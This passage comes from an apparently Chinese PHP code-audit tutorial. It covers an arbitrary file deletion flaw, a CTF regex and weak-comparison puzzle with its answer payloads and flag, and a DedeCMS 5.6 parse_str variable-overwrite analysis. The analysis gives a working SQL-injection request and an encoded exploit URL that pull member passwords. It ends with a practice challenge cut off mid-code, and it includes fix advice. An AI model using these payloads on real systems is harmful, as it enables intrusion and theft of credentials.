<strong>category.ctrl.php</strong> 文件。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-32.png"></p><p>选择对应的内容，进入 <strong>if($isnav)</strong> 判断：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-33.png"></p><p>在上传图标位置输入要删除文件的路径</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-34.png"></p><p>我们建立 <strong>delete.txt</strong> 文件，用于测试任意文件删除：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-35.png"></p><p>我们点击删除时，就会调用 <strong>file_delete</strong> 函数，同时就会删除掉我们插入到数据库中的图片名：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-36.png"></p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-37.png"></p><p>这个类型任意文件删除有点类似于二次注入，在添加分类时先把要删除的文件名称插入到数据库中，然后点击删除分类时，会从数据库中取出要删除的文件名。</p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>漏洞是没有对 <code>$row[&#39;icon&#39;]</code> 参数进行过滤，可以将文件名内容加入目录阶层字符，造成任意文件删除漏洞，所以我们要在传入的参数中过滤”..&#x2F;“等目录阶层字符，避免目录穿越，删除其他文件夹下文件。我们在修复中可以过滤掉 <code>$row[&#39;icon&#39;]</code> 中的目录穿越字符，引入我们自定义的一个函数 <code>checkstr</code> 函数。同时 <code>$row[&#39;icon&#39;]</code> 只是文件的名称，并非是一个路径，因此过滤字符并不会影响到实际功能，对此修复意见我们提供如下代码：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-38.png"></p><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>  (<span class="string">&quot;POST&quot;</span> == <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="variable">$password</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Wrong Format&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">TRUE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$reg</span> = <span class="string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$ps</span> = <span class="keyword">array</span>(<span class="string">&#x27;punct&#x27;</span>, <span class="string">&#x27;digit&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ps</span> <span class="keyword">as</span> <span class="variable">$pt</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[[:<span class="subst">$pt</span>:]]+/&quot;</span>, <span class="variable">$password</span>))</span><br><span class="line">            <span class="variable">$c</span> += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$c</span> &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;42&quot;</span> == <span class="variable">$password</span>) <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&#x27;Wrong password&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$flag</span> = <span class="string">&quot;HRCTF&#123;Pr3g_R3plac3_1s_Int3r3sting&#125;&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题目实际上考察的是大家是否熟悉PHP正则表达式的字符类，当然还涉及到一些弱类型比较问题。大家可以先查阅一下PHP手册对这些字符类的定义，具体可点 <a href="http://php.net/manual/zh/regexp.reference.character-classes.php">这里</a> 。</p><table><thead><tr><th><em>alnum</em></th><th>字母和数字</th></tr></thead><tbody><tr><td><em>alpha</em></td><td>字母</td></tr><tr><td><em>ascii</em></td><td>0 - 127的ascii字符</td></tr><tr><td><em>blank</em></td><td>空格和水平制表符</td></tr><tr><td><em>cntrl</em></td><td>控制字符</td></tr><tr><td><em>digit</em></td><td>十进制数(same as \d)</td></tr><tr><td><em>graph</em></td><td>打印字符, 不包括空格</td></tr><tr><td><em>lower</em></td><td>小写字母</td></tr><tr><td><em>print</em></td><td>打印字符,包含空格</td></tr><tr><td><em>punct</em></td><td>打印字符, 不包括字母和数字</td></tr><tr><td><em>space</em></td><td>空白字符 (比\s多垂直制表符)</td></tr><tr><td><em>upper</em></td><td>大写字母</td></tr><tr><td><em>word</em></td><td>单词字符(same as \w)</td></tr><tr><td><em>xdigit</em></td><td>十六进制数字</td></tr></tbody></table><p>题目中总共有三处正则匹配，我们分别来看一下其对应的含义。<br>第一处的正则 <strong>&#x2F;^[[:graph:]]{12,}$&#x2F;</strong> 为：匹配到可打印字符12个以上(包含12)，<strong>^</strong> 号表示必须以某类字符开头，**$** 号表示必须以某类字符结尾。</p><p>第二处正则表达式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$reg</span>, <span class="variable">$password</span>, <span class="variable">$arr</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>表示字符串中，把连续的符号、数字、大写、小写，作为一段，至少分六段，例如我们输入 <strong>H0ng+Ri</strong> 则匹配到的子串为 <strong>H   0   ng   +   R   i</strong> 。</p><p>第三处的正则表达式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ps</span> = <span class="keyword">array</span>(<span class="string">&#x27;punct&#x27;</span>, <span class="string">&#x27;digit&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ps</span> <span class="keyword">as</span> <span class="variable">$pt</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[[:<span class="subst">$pt</span>:]]+/&quot;</span>, <span class="variable">$password</span>))</span><br><span class="line">    <span class="variable">$c</span> += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$c</span> &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>表示为输入的字符串至少含有符号、数字、大写、小写中的三种类型。然后题目最后将 <strong>$password</strong> 与42进行了弱比较。所以我们的payload为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">42.00e+00000</span></span><br><span class="line">password=<span class="number">420.00000e-1</span></span><br></pre></td></tr></table></figure><p>网络上还有一种解法是： <strong>password&#x3D;\x34\x32\x2E</strong> ，但是这种解法并不可行，大家可以思考一下为什么。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-39.png"></p><p>在 PHP 中，提交形如 <code>password=\x34\x32\x2E</code> 的 payload 是不可行的，主要因为这种表达方式并不会被 PHP 以你可能预期的方式解释。</p><ol><li><strong>解析方式</strong>：在 PHP 中，字符串 <code>\x34\x32\x2E</code> 会被直接当作普通字符串处理，而不是解释为它们对应的 ASCII 字符。这意味着 <code>\x34</code> 不会被解释为数字 “4”，<code>\x32</code> 不会被解释为数字 “2”，<code>\x2E</code> 不会被解释为点号 “.”。因此，这个字符串实际上是由 <code>\x34\x32\x2E</code> 组成的原始文本，而不是你可能期待的 “42.”。</li><li><strong>正则表达式匹配</strong>：因为字符串是按原样处理的，所以在 <code>preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)</code> 这一步，检查密码是否符合至少12个可打印字符的规则时，<code>\x34\x32\x2E</code> 这个字符串不会满足条件。即使它的长度可能超过12个字符，这些字符并不全部是可打印字符。</li><li><strong>类型弱比较</strong>：即便这个字符串能够通过前面的正则表达式验证，PHP 在与 “42” 进行弱类型比较时，也会将 <code>\x34\x32\x2E</code> 视为一个普通字符串，这并不会被自动转换成数值 42。PHP 中的弱类型比较通常涉及到数字字符串和整数之间的比较，例如 “42” 与 42 或 “42.0” 与 42 等，但不会将包含非数字字符的字符串视为数值。</li></ol><p>PS：在 <a href="https://xz.aliyun.com/t/2523">代码审计Day6 - 正则使用不当导致的路径穿越问题</a> 的文章评论下面，我们提及了一个经典的通过正则写配置文件的案例，这个案例具体怎么绕过并写入shell，大家可以参考 <a href="https://github.com/wonderkun/CTF_web/tree/dcf36cb9ba9a580a4e8d92b43480b6575fed2c3a/web200-7"> <strong>这里</strong> </a> 。</p><h2 id="Bell"><a href="#Bell" class="headerlink" title="Bell"></a>Bell</h2><p>题目叫做钟，代码如下：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-40.png"></p><p><strong>漏洞解析</strong> ：</p><p>这一关其实是考察变量覆盖漏洞，⽽导致这⼀漏洞的发⽣则是不安全的使⽤ <strong>parse_str</strong> 函数。 由于 <strong>第21行</strong> 中的 <strong>parse_str()</strong> 调用，其行为非常类似于注册全局变量。我们通过提交类似 <strong>config[dbhost]&#x3D;127.0.0.1</strong> 这样类型的数据，这样因此我们可以控制 <strong>getUser()</strong> 中第5到8行的全局变量 <strong>$config</strong> 。如果目标存在登陆验证的过程，那么我们就可以通过变量覆盖的方法，远程连接我们自己的mysql服务器，从而绕过这块的登陆验证，进而进行攻击。我们来看看PHP官方对 <strong>parse_str</strong> 函数的定义：</p><blockquote><p><a href="http://php.net/manual/zh/function.parse-str.php"> <strong>parse_str</strong> </a></p><p><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p><p><strong>定义</strong> ：<code>void parse_str( string $encoded_string [, array &amp;$result ] )</code></p><p>如果 <strong>encoded_string</strong> 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</p></blockquote><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-41.png"></p><h3 id="实例分析-2"><a href="#实例分析-2" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong>DedeCmsV5.6</strong> 版本。该版本的<strong>buy_action.php</strong>处存在SQL注入漏洞，这里其实和 <strong>parse_str</strong> 有很大关系，下⾯我们来看看具体的漏洞位置。</p><p>官网于20140225发布了<strong>V5.7.36</strong> 正式版0225常规更新补丁，这里面的改动一共四个文件 <strong>dede&#x2F;sys_info.php</strong> 、 <strong>dede&#x2F;templets&#x2F;sys_info.htm</strong> 、<strong>include&#x2F;uploadsafe.inc.php</strong> 、<strong>member&#x2F;buy_action.php</strong> 。这里我们关注一下 <strong>member&#x2F;buy_action.php</strong> 这个文件的改动情况。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-42.png"></p><p>diff一下补丁和源文件：（这里采用sublime的FileDiffs插件来进行diff对比）</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-43.png"></p><p>改动部分，主要针对加密函数的强度进行了加强，所以做一个推断这个漏洞应该是由于 <strong>mchStrCode</strong> 这个编码方法造成的。在读这个函数时发现，如果在我们知道 <strong>cfg_cookie_encode</strong> 的情况下，被编码字符串是可以被逆推出来的。</p><p>这个漏洞在乌云上爆出来的时候，是sql注入，所以我推断可能在调用这个编码函数进行解码的地方，解码之后可能没有任何过滤和绕过，又或者可以可绕过过滤，导致sql语句拼接写入到了数据库，而且这里解码的函数可以被攻击者控制，从而导致了SQL注入的产生。</p><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>我们全局搜索一下哪些地方调用了这个 <strong>mchStrCode</strong> 函数，发现有三处（可以用sublime <code>Ctrl+Shitf+F</code> 进行搜索）：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-44.png"></p><p><strong>第17行</strong> (上图)的 <strong>parse_str</strong> 引起了我的兴趣，看一下这一小段代码做了些什么（下图第4行处）：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-45.png"></p><p>我们重点来看if语句开始时的三行代码， <strong>mchStrCode</strong> 是我们在上一小节通过对比补丁发现变化的函数。也就是说，这个函数可以编码或者解码用户提交的数据，而且 <strong>$pd_encode</strong> 也是我们可以控制的变量。</p><p><strong>parse_str</strong> 方法将解码后 <strong>$pd_encode</strong> 中的变量放到 <strong>$mch_Post</strong> 数组中，之后的 <strong>foreach</strong> 语句存在明显的变量覆盖，将 <strong>$mch_Post</strong> 中的key定义为变量，同时将key所对应的value赋予该变量。然后，再向下就是执行SQL查询了。</p><p>在这个过程中存在一个明显的疏忽是，没有对定义的 <strong>key</strong> 进行检查，导致攻击者可以通过 <strong>mschStrCode</strong> 对攻击代码进行编码，从而绕过GPC和其他过滤机制，使攻击代码直达目标。我们再来看看 <strong>mchStrCode</strong> 函数的代码：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-46.png"></p><p>上图我们要注意第三行 <strong>$key</strong> 值的获取方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_USER_AGENT&quot;</span>].<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_cookie_encode&#x27;</span>]),<span class="number">8</span>,<span class="number">18</span>);</span><br></pre></td></tr></table></figure><p>这里将 <strong>$_SERVER[“HTTP_USER_AGENT”]</strong> 和 <strong>$GLOBALS[‘cfg_cookie_encode’]</strong> 进行拼接，然后进行md5计算之后取前 <strong>18</strong> 位字符，其中的 <strong>$_SERVER[“HTTP_USER_AGENT”]</strong> 是浏览器的标识，可以被我们控制，关键是这个 <strong>$GLOBALS[‘cfg_cookie_encode’]</strong> 是怎么来的。通过针对补丁文件的对比，发现了 <strong>&#x2F;install&#x2F;index.php</strong> 的 <strong>$rnd_cookieEncode</strong> 字符串的生成同样是加强了强度， <strong>$rnd_cookieEncode</strong> 字符串最终也就是前面提到的 <strong>$GLOBALS[‘cfg_cookie_encode’]</strong> </p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-47.png"></p><p>看看源代码里是怎么处理这个的 <strong>$rnd_cookieEncode</strong> 变量的。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-48.png"></p><p>这段代码生成的加密密匙很有规律，所有密匙数为26^6*(9999-1000)&#x3D;2779933068224,把所有可能的组合生成字典，用passwordpro暴力跑MD5或者使用GPU来破解，破解出md5过的密匙也花不了多少时间。 当然这个是完全有可能的，但是很耗时间，所以下一步看看有没有办法能够绕过这个猜测的过程，让页面直接回显回来。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>虽然整个漏洞利用原理很简单，但是利用难度还是很高的，关键点还是如何解决这个 <strong>mchStrCode</strong> ， <strong>mchStrCode</strong> 这个函数的编码过程中需要知道网站预设的 <strong>cfg_cookie_encode</strong> ，而这个内容在用户界面只可以获取它的MD5值。虽然<strong>cfg_cookie_encode</strong>的生成有一定的规律性，我们可以使用MD5碰撞的方法获得，但是时间成本太高，感觉不太值得。所以想法是在什么地方可以使用 <strong>mchStrCode</strong> 加密可控参数，并且能够返回到页面中。所以搜索一下全文哪里调用了这个函数。</p><p>于是，我们在 <strong>member&#x2F;buy_action.php</strong> 的104行找到了一处加密调用：**$pr_encode &#x3D; str_replace(‘&#x3D;’, ‘’, mchStrCode($pr_encode));** 我们来看一下这个分支的整个代码：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-49.png"></p><p>这里的 <strong>第38行</strong> 有一 <code>$tpl-&gt;LoadTemplate(DEDEMEMBER.&#39;/templets/buy_action_payment.htm&#39;);</code> 在 <strong>&#x2F;templets&#x2F;buy_action_payment.htm</strong> 中，我找到了页面上回显之前加密的 <strong>$pr_encode</strong> 和 <strong>$pr_verify</strong> 。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-50.png"></p><p>通过这部分代码，我们可以通过 <strong>[cfg_dbprefix&#x3D;SQL注入]</strong> 的提交请求，进入这个分支，让它帮助我来编码 <strong>[cfg_dbprefix&#x3D;SQL注入]</strong> ，从而获取相应的 <strong>pr_encode</strong> 和 <strong>pr_verify</strong> 。 但是 <strong>common.inc.php</strong> 文件对用户提交的内容进行了过滤，凡提交的值以cfg、GLOBALS、GET、POST、COOKIE 开头都会被拦截，如下图第11行。</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-51.png"></p><p>这个问题的解决就利用到了 <strong>$REQUEST</strong> 内容与 <strong>parse_str</strong> 函数内容的差异特性。我们url传入的时候通过**[a&#x3D;1&amp;b&#x3D;2%26c&#x3D;3]<strong>这样的提交时， <strong>$REQUEST</strong> 解析的内容就是 <strong>[a&#x3D;1，b&#x3D;2%26c&#x3D;3]</strong> 。而通过上面代码的遍历进入 <strong>parse_str</strong> 函数的内容则是 <strong>[a&#x3D;1&amp;b&#x3D;2&amp;c&#x3D;3]</strong> ，因为 <strong>parse_str</strong> 函数会针对传入进来的数据进行解码，所以解析后的内容就变成了</strong>[a&#x3D;1，b&#x3D;2，c&#x3D;3]**。所以可以通过这种方法绕过 <strong>common.inc.php</strong> 文件对于参数内容传递的验证。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 <strong>buy_action.php</strong> 文件，使用如下参数：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">product</span>=<span class="selector-tag">card</span><span class="selector-tag">&amp;</span><span class="selector-tag">pid</span>=<span class="number">1</span><span class="selector-tag">&amp;</span><span class="selector-tag">a</span>=<span class="number">1%</span><span class="number">26</span><span class="selector-tag">cfg_dbprefix</span>=<span class="selector-tag">dede_member_operation</span> <span class="selector-tag">WHERE</span> <span class="number">1</span>=@&#x27;/!<span class="number">12345</span><span class="selector-tag">union</span>/ <span class="selector-tag">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="selector-tag">FROM</span> (SELECT <span class="built_in">COUNT</span>(),<span class="built_in">CONCAT</span>( (SELECT pwd FROM dede_member LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">FLOOR</span>(<span class="built_in">RAND</span>(<span class="number">0</span>)<span class="number">2</span>))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)<span class="selector-tag">a</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>其中 <strong>product</strong> 和 <strong>pid</strong> 参数是为了让我们进入 <strong>mchStrCode</strong> 对传入数据进行编码的分支，参数 <strong>a</strong> 是为了配合上面提到的差异性而随意添加的参数。从 <strong>cfg_dbprefix</strong> 开始，便是真正的SQL注入攻击代码。 访问该URL后，在页面源码中找到 <strong>pd_encode</strong> 和 <strong>pd_verify</strong> 字段的值，由于用户 <strong>Cookie</strong> 和 <strong>User-Agent</strong> 不同，所获取的值也不同，然后在页面上找到了 <strong>pd_encode</strong> 和 <strong>pd_verify</strong>的值，如下图：</p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-52.png"></p><p>最后再构造一下payload就好了：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1//dedecms5.6/member/buy_action.php?pd_encode=QEpWVhZbEV9SUkBUEEBfAF8CFlkEA0VbAwVuV1BARFVQDRoOVF1dVzxVAA9TVkBvWUBTFgNHWVdXEjRwIDB0EwMNdhcZRVMBAwwMRw1RCgweE0FVWlVVEEICHAoVAU8MSVcdBR4HGggaXU4CABh/YCx1RUpidn51dWQWJy1mfmwRG097KixycmYYFhhlIS52c2wZQhRcRSRjfH8QUlVSAT1eVVVbVxEYKSt8emYQBhwHTU51fHd2YEtqJCx1GwIZBBkfHEJ1Ynd0Eip2Iy1jfnNkf394OzFweH10c017LSNjcnFkc2JpNydnYxh+YCxtNUJzahJIH1EWR0RmfWddWxBMDAxSR1tUCwEAUFEEBV4JVFEBUVYIHgIHAQRQXAQHCAsLAAIBSFYJBgUGUB0HVwEFCAgUA1UMVlUEVQJWBFIBUAQVc3ZjaCd5MSMAAwIABgYBU1IHDQkBB1IIVVMBBQcdBwUEXVsABwsKAU5QERZBFgFxEwJwQVB1AQELHFIOXUwDBwoeBwIPQVB1TAkMAFoBVlUCAAEWVFRFDANBVWdfWxFLEQtcVg8BAwMGVFMEBg8PBVUAQzJ5Y2F1ZWN/IF9XA1tdBFVeVAcIAlRVDlJVAFtRVV5YC1INAVsHBgpUBBZyAQZWZUtcQCp8WFAXd1dUU2VFARB6dGdmUQh1AVcMAABVAVJSVVcKAABdAlAAA0R1VlZVel9RDQxnWVVcD1INVlICAAICBwQQIAdXVXRWVQpWMQtcVm1vVVt7AFcOAl4IAlANBFUGVlMFBFIHUA&amp;pd_verify=fbe183b4c5a69ac7fb394a4b5cd5cfcb</span><br></pre></td></tr></table></figure><p>再次提醒，因为每个人的 <strong>cookie</strong> 和 <strong>User-Agent</strong> 都不一样，所以生成的也不一样，建议大家自己生成一下。</p><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>为了解决变量覆盖问题，可以在注册变量前先判断变量是否存在，如果使用 <strong>extract</strong> 函数可以配置第二个参数是 <strong>EXTR_SKIP</strong> 。使用 <strong>parse_str</strong> 函数之前先自行通过代码判断变量是否存在。</p><p>这里提供一个demo漏洞样例代码，以及demo的修复方法。</p><p><strong>demo漏洞</strong></p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-53.png"></p><p><strong>demo漏洞修复</strong></p><p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-54.png"></p><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>看完了上述分析，不知道大家是否对 <strong>parse_str()</strong> 函数有了更加深入的理解，文中用到的CMS可以从 <a href="http://www.dedecms.com/upimg/soft/2010/DedeCmsV5.6-UTF8-Final.tar.gz">这里</a> 下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <strong><a href="mailto:&#104;&#x6f;&#110;&#x67;&#x72;&#105;&#115;&#x65;&#x63;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#104;&#x6f;&#110;&#x67;&#x72;&#105;&#115;&#x65;&#x63;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#x6d;</a></strong> 联系我们。<strong>Day7</strong> 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = “hongri”;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span>[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>[<span class="number">0</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;uploadsomething.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//uploadsomething.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$referer</span>)!== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$savepath</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$savepath</span>)) &#123;</span><br><span class="line">        <span class="variable">$oldmask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$savepath</span>, <span class="number">0777</span>);</span><br><span class="line">        <span class="title function_ invoke__">umask</span>(<span class="variable">$oldmask</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((@<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment">//$fp = 